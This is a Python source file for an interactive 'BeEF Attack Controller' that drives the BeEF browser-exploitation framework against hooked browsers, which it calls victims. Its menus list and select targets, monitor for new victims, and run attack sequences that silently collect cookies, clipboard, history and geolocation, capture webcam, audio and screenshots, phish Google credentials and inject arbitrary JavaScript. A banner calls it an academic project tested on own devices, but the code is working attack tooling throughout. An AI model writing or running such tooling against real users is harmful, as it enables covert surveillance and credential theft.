#!/usr/bin/env python3
"""
BeEF Attack Controller - Main Script
Interactive menu-driven interface for BeEF exploitation
"""
import sys
import time
import subprocess
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm

from beef_api import BeEFAPI
from attack_manager import AttackManager
from result_collector import ResultCollector

console = Console()

class BeEFController:
    """Main controller for BeEF attacks"""
    
    def __init__(self):
        self.api = BeEFAPI()
        self.attack_manager = AttackManager(self.api)
        self.result_collector = ResultCollector(self.api)
        self.current_session = None
    
    def print_banner(self):
        """Display application banner"""
        banner = """
╔════════════════════════════════════════════════════╗
║     BeEF Attack Controller v3.0                   ║
║     Modular Attack Framework                       ║
║                                                    ║
║     Academic Project - Testing on Own Devices     ║
╚════════════════════════════════════════════════════╝
        """
        console.print(f"[bold cyan]{banner}[/bold cyan]")
    
    def check_beef_status(self):
        """Check if BeEF is running"""
        if self.api.is_running():
            console.print("[green]✓ BeEF is running[/green]")
            console.print(f"[dim]URL: http://{self.api.host}:{self.api.port}/ui/panel[/dim]")
            return True
        else:
            console.print("[red]✗ BeEF is not running[/red]")
            return False
    
    def start_beef(self):
        """Start BeEF framework"""
        console.print("\n[bold cyan]Starting BeEF Framework...[/bold cyan]\n")
        
        if self.api.is_running():
            console.print("[yellow]BeEF is already running![/yellow]")
            return True
        
        console.print("[yellow]Starting BeEF (this may take 10-15 seconds)...[/yellow]")
        
        try:
            process = subprocess.Popen(
                ['beef-xss'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True,
                text=True
            )
            
            # Wait for BeEF to start
            max_wait = 20
            for i in range(max_wait):
                time.sleep(1)
                if self.api.is_running():
                    console.print(f"\n[green]✓ BeEF started successfully! (PID: {process.pid})[/green]")
                    console.print(f"[blue]BeEF UI: http://{self.api.host}:{self.api.port}/ui/panel[/blue]")
                    console.print(f"[blue]Credentials: {self.api.username} / {self.api.password}[/blue]")
                    time.sleep(2)  # Let it fully initialize
                    return True
                
                if i % 3 == 0 and i > 0:
                    console.print(f"[dim]Waiting... ({i+1}/{max_wait})[/dim]")
            
            console.print("\n[red]✗ BeEF failed to start![/red]")
            console.print("[yellow]Try manually: beef-xss[/yellow]")
            return False
            
        except FileNotFoundError:
            console.print("\n[red]✗ BeEF not found![/red]")
            console.print("[yellow]Install it: sudo apt install beef-xss[/yellow]")
            return False
        except Exception as e:
            console.print(f"\n[red]✗ Error: {e}[/red]")
            return False
    
    def list_hooked_browsers(self):
        """Display hooked browsers"""
        console.print("\n[bold cyan]Fetching hooked browsers...[/bold cyan]\n")
        
        browsers = self.api.get_hooked_browsers()
        
        if not browsers:
            console.print("[yellow]No hooked browsers found[/yellow]")
            console.print("[dim]Waiting for victims to click the link...[/dim]\n")
            return []
        
        table = Table(title=f"🎯 Hooked Browsers ({len(browsers)})", show_header=True)
        table.add_column("#", style="cyan", width=3)
        table.add_column("Session ID", style="cyan", no_wrap=True)
        table.add_column("IP Address", style="green")
        table.add_column("Browser", style="yellow")
        table.add_column("OS", style="magenta")
        table.add_column("Status", style="green")
        
        for idx, hook in enumerate(browsers, 1):
            session = str(hook.get('session', 'Unknown'))
            ip = hook.get('ip', 'Unknown')
            browser = hook.get('name', 'Unknown')
            
            os_info = hook.get('os', 'Unknown')
            if isinstance(os_info, dict):
                os_name = os_info.get('name', 'Unknown')
            else:
                os_name = str(os_info)
            
            table.add_row(str(idx), session, ip, browser, os_name, "🟢 Online")
        
        console.print(table)
        console.print()
        
        return browsers
    
    def select_target(self):
        """Let user select a target browser"""
        browsers = self.list_hooked_browsers()
        
        if not browsers:
            return None
        
        if len(browsers) == 1:
            self.current_session = browsers[0].get('session')
            console.print(f"[green]Auto-selected target: {self.current_session}[/green]\n")
            return self.current_session
        
        while True:
            choice = Prompt.ask(
                "[cyan]Select target number (or 'b' for back)[/cyan]",
                default="1"
            )
            
            if choice.lower() == 'b':
                return None
            
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(browsers):
                    self.current_session = browsers[idx].get('session')
                    console.print(f"[green]Selected: {self.current_session}[/green]\n")
                    return self.current_session
                else:
                    console.print("[red]Invalid selection[/red]")
            except ValueError:
                console.print("[red]Please enter a number[/red]")
    
    def list_available_attacks(self):
        """Display all available attacks by category"""
        console.print("\n[bold cyan]Available Attacks[/bold cyan]\n")
        
        categories = self.attack_manager.get_categories()
        
        for category in categories:
            attacks = self.attack_manager.list_attacks(category)
            
            category_title = category.replace('_', ' ').title()
            table = Table(title=f"📋 {category_title}", show_header=True)
            table.add_column("Key", style="cyan", width=20)
            table.add_column("Name", style="yellow", width=30)
            table.add_column("Description", style="white")
            
            for key, attack in attacks.items():
                info = attack.get_info()
                table.add_row(key, info['name'], info['description'])
            
            console.print(table)
            console.print()
    
    def execute_single_attack(self):
        """Execute a single attack"""
        if not self.current_session:
            console.print("[yellow]No target selected. Select a target first.[/yellow]")
            return
        
        self.list_available_attacks()
        
        attack_key = Prompt.ask("[cyan]Enter attack key (or 'b' for back)[/cyan]")
        
        if attack_key.lower() == 'b':
            return
        
        attack = self.attack_manager.get_attack(attack_key)
        
        if not attack:
            console.print(f"[red]Attack '{attack_key}' not found[/red]")
            return
        
        # Check if attack needs parameters
        params = {}
        if attack_key == 'redirect':
            url = Prompt.ask("[cyan]Enter URL to redirect to[/cyan]", 
                           default="https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            params['url'] = url
        elif attack_key == 'alert':
            text = Prompt.ask("[cyan]Enter alert text[/cyan]", 
                            default="You have been hacked!")
            params['text'] = text
        elif attack_key == 'javascript':
            code = Prompt.ask("[cyan]Enter JavaScript code[/cyan]", 
                            default="alert('Hacked!')")
            params['code'] = code
        elif attack_key == 'webcam_record':
            duration = Prompt.ask("[cyan]Enter recording duration (seconds)[/cyan]", 
                                default="10")
            params['duration'] = duration
        
        console.print(f"\n[yellow]Executing {attack.name}...[/yellow]\n")
        success, result = attack.execute(self.current_session, **params)
        
        if success:
            console.print(f"\n[green]✓ Attack completed successfully![/green]")
            
            save = Confirm.ask("\n[cyan]Save results now?[/cyan]", default=False)
            if save:
                # Use 20s wait time for single attacks
                self.result_collector.save_all_results(
                    self.current_session,
                    [(attack_key, success, result)],
                    wait_for_results=20
                )
        else:
            console.print(f"\n[red]✗ Attack failed[/red]")
    
    def execute_attack_sequence(self):
        """Execute a predefined attack sequence"""
        if not self.current_session:
            console.print("[yellow]No target selected. Select a target first.[/yellow]")
            return
        
        console.print("\n[bold cyan]Attack Sequences[/bold cyan]\n")
        
        sequences = {
            '1': {
                'name': 'Silent Information Gathering',
                'attacks': ['fingerprint', 'cookies', 'clipboard', 'detect_social'],
                'description': 'Gather victim info without alerting them'
            },
            '2': {
                'name': 'Full Information Extraction',
                'attacks': ['fingerprint', 'geolocation', 'cookies', 'history', 'clipboard', 'detect_social'],
                'description': 'Complete silent data collection'
            },
            '3': {
                'name': 'Media Capture',
                'attacks': ['screenshot', 'webcam', 'audio_start'],
                'description': 'Capture photos and start audio recording (requires permissions)'
            },
            '4': {
                'name': 'Credential Harvesting',
                'attacks': ['google_phish', 'fake_notification'],
                'description': 'Social engineering attacks for credential theft'
            },
            '5': {
                'name': 'Full Attack Chain',
                'attacks': [
                    'fingerprint', 'geolocation', 'cookies', 'detect_social',
                    'clipboard', 'history', 'screenshot', 'webcam_record',
                    'audio_start', 'google_phish', 'fake_notification'
                ],
                'description': 'Complete attack sequence (recommended) - Mobile: 2-3 min for results'
            },
            '6': {
                'name': 'Quick Test',
                'attacks': ['fingerprint', 'cookies', 'screenshot'],
                'description': 'Quick test attacks'
            }
        }
        
        table = Table(show_header=True)
        table.add_column("#", style="cyan", width=3)
        table.add_column("Sequence Name", style="yellow", width=35)
        table.add_column("# Attacks", style="green", width=10)
        table.add_column("Description", style="white")
        
        for key, seq in sequences.items():
            table.add_row(key, seq['name'], str(len(seq['attacks'])), seq['description'])
        
        console.print(table)
        console.print()
        
        choice = Prompt.ask("[cyan]Select sequence number (or 'b' for back)[/cyan]")
        
        if choice.lower() == 'b':
            return
        
        if choice not in sequences:
            console.print("[red]Invalid selection[/red]")
            return
        
        sequence = sequences[choice]
        
        console.print(f"\n[bold yellow]Selected: {sequence['name']}[/bold yellow]")
        console.print(f"[dim]Attacks: {', '.join(sequence['attacks'])}[/dim]\n")
        
        confirm = Confirm.ask(f"[cyan]Execute {len(sequence['attacks'])} attacks?[/cyan]", default=True)
        
        if not confirm:
            return
        
        console.print(f"\n[bold cyan]Executing attack sequence...[/bold cyan]\n")
        
        results = self.attack_manager.execute_sequence(
            sequence['attacks'],
            self.current_session
        )
        
        # Display summary
        console.print("\n" + "=" * 60)
        console.print("[bold cyan]ATTACK SEQUENCE COMPLETED[/bold cyan]")
        console.print("=" * 60 + "\n")
        
        success_count = sum(1 for _, success, _ in results if success)
        
        table = Table(show_header=True)
        table.add_column("Attack", style="cyan", width=25)
        table.add_column("Status", style="green", width=15)
        
        for attack_name, success, _ in results:
            status = "✓ Success" if success else "✗ Failed"
            style = "green" if success else "red"
            table.add_row(attack_name.upper(), f"[{style}]{status}[/{style}]")
        
        console.print(table)
        console.print(f"\n[cyan]Success Rate: {success_count}/{len(results)} ({success_count/len(results)*100:.1f}%)[/cyan]\n")
        
        save = Confirm.ask("[cyan]Save all results to disk?[/cyan]", default=True)
        
        if save:
            # Use longer wait time for full attack chain (especially for mobile devices)
            wait_time = 60  # 60 seconds for mobile browsers with camera/mic
            console.print(f"[yellow]Note: Mobile devices may need 1-2 minutes for all results[/yellow]")
            self.result_collector.save_all_results(
                self.current_session,
                results,
                wait_for_results=wait_time
            )
    
    def execute_custom_attacks(self):
        """Let user select multiple attacks to execute"""
        if not self.current_session:
            console.print("[yellow]No target selected. Select a target first.[/yellow]")
            return
        
        self.list_available_attacks()
        
        console.print("[cyan]Enter attack keys separated by commas (e.g., fingerprint,cookies,screenshot)[/cyan]")
        attack_keys = Prompt.ask("[cyan]Attack keys[/cyan]")
        
        keys = [k.strip() for k in attack_keys.split(',')]
        
        # Validate all keys
        invalid = [k for k in keys if not self.attack_manager.get_attack(k)]
        if invalid:
            console.print(f"[red]Invalid attack keys: {', '.join(invalid)}[/red]")
            return
        
        console.print(f"\n[yellow]Will execute {len(keys)} attacks: {', '.join(keys)}[/yellow]\n")
        
        confirm = Confirm.ask("[cyan]Proceed?[/cyan]", default=True)
        
        if not confirm:
            return
        
        console.print(f"\n[bold cyan]Executing attacks...[/bold cyan]\n")
        
        results = self.attack_manager.execute_sequence(keys, self.current_session)
        
        # Display summary
        success_count = sum(1 for _, success, _ in results if success)
        console.print(f"\n[cyan]Completed: {success_count}/{len(results)} successful[/cyan]\n")
        
        save = Confirm.ask("[cyan]Save results?[/cyan]", default=True)
        
        if save:
            # Use 30s wait time for custom attacks
            self.result_collector.save_all_results(
                self.current_session,
                results,
                wait_for_results=30
            )
    
    def monitor_for_victims(self):
        """Monitor for new hooked browsers"""
        console.print("\n[green]🔍 Monitoring for hooked browsers...[/green]")
        console.print("[yellow]Press Ctrl+C to stop[/yellow]\n")
        
        seen_sessions = set()
        
        try:
            while True:
                browsers = self.api.get_hooked_browsers()
                
                for browser in browsers:
                    session = browser.get('session')
                    if session and session not in seen_sessions:
                        seen_sessions.add(session)
                        
                        os_info = browser.get('os', {})
                        if isinstance(os_info, dict):
                            os_name = os_info.get('name', 'Unknown')
                        else:
                            os_name = str(os_info)
                        
                        panel_content = f"""
[green]Session:[/green] [cyan]{session}[/cyan]
[green]IP:[/green] [cyan]{browser.get('ip', 'Unknown')}[/cyan]
[green]Browser:[/green] [cyan]{browser.get('name', 'Unknown')}[/cyan]
[green]OS:[/green] [cyan]{os_name}[/cyan]
                        """
                        
                        console.print(Panel(
                            panel_content.strip(),
                            title="🎯 NEW VICTIM HOOKED",
                            border_style="green"
                        ))
                        console.print()
                
                time.sleep(3)
                
        except KeyboardInterrupt:
            console.print("\n[yellow]Monitoring stopped[/yellow]\n")
    
    def main_menu(self):
        """Display and handle main menu"""
        while True:
            console.print("\n[bold cyan]═══════════════════════════════════════[/bold cyan]")
            console.print("[bold cyan]           MAIN MENU[/bold cyan]")
            console.print("[bold cyan]═══════════════════════════════════════[/bold cyan]\n")
            
            # Show current status
            if self.api.is_running():
                console.print("[green]Status: BeEF is running ✓[/green]")
            else:
                console.print("[red]Status: BeEF is not running ✗[/red]")
            
            if self.current_session:
                console.print(f"[cyan]Current Target: {self.current_session[:16]}...[/cyan]")
            else:
                console.print("[yellow]Current Target: None selected[/yellow]")
            
            console.print("\n[bold yellow]Options:[/bold yellow]")
            console.print("  [cyan]1.[/cyan] Start BeEF Framework")
            console.print("  [cyan]2.[/cyan] List Hooked Browsers")
            console.print("  [cyan]3.[/cyan] Select Target")
            console.print("  [cyan]4.[/cyan] Monitor for Victims")
            console.print("  [cyan]5.[/cyan] List Available Attacks")
            console.print("  [cyan]6.[/cyan] Execute Single Attack")
            console.print("  [cyan]7.[/cyan] Execute Attack Sequence (Recommended)")
            console.print("  [cyan]8.[/cyan] Execute Custom Attacks")
            console.print("  [cyan]9.[/cyan] Check BeEF Status")
            console.print("  [cyan]0.[/cyan] Exit")
            
            choice = Prompt.ask("\n[bold cyan]Select option[/bold cyan]", default="7")
            
            try:
                if choice == '1':
                    self.start_beef()
                elif choice == '2':
                    self.list_hooked_browsers()
                elif choice == '3':
                    self.select_target()
                elif choice == '4':
                    self.monitor_for_victims()
                elif choice == '5':
                    self.list_available_attacks()
                elif choice == '6':
                    self.execute_single_attack()
                elif choice == '7':
                    self.execute_attack_sequence()
                elif choice == '8':
                    self.execute_custom_attacks()
                elif choice == '9':
                    self.check_beef_status()
                elif choice == '0':
                    console.print("\n[yellow]Exiting...[/yellow]")
                    console.print("[cyan]Note: BeEF is still running in background[/cyan]")
                    console.print("[cyan]Stop it manually if needed: pkill -f beef[/cyan]\n")
                    break
                else:
                    console.print("[red]Invalid option[/red]")
            except KeyboardInterrupt:
                console.print("\n[yellow]Interrupted[/yellow]")
            except Exception as e:
                console.print(f"\n[red]Error: {e}[/red]")
                import traceback
                console.print(f"[dim]{traceback.format_exc()}[/dim]")
    
    def run(self):
        """Main entry point"""
        self.print_banner()
        
        # Check if BeEF is running
        if not self.check_beef_status():
            console.print("[yellow]Start BeEF first (option 1 in menu)[/yellow]\n")
        
        self.main_menu()

def main():
    """Entry point"""
    try:
        controller = BeEFController()
        controller.run()
    except KeyboardInterrupt:
        console.print("\n\n[yellow]Interrupted by user[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]Fatal error: {e}[/red]")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")
        sys.exit(1)

if __name__ == '__main__':
    main()
